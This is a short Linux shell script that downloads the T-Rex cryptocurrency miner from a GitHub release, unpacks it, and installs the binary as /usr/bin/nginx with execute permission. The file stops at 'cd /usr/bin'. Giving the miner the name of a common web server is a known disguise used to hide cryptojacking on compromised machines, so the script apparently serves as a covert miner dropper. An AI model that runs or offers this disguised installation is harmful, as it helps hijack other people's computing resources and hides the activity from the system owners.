wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
sleep 10
tar zxf t-rex-0.26.8-linux.tar.gz
sleep 1
mv t-rex /usr/bin/nginx
sleep 1
chmod +x /usr/bin/nginx
sleep 1
cd /usr/bin
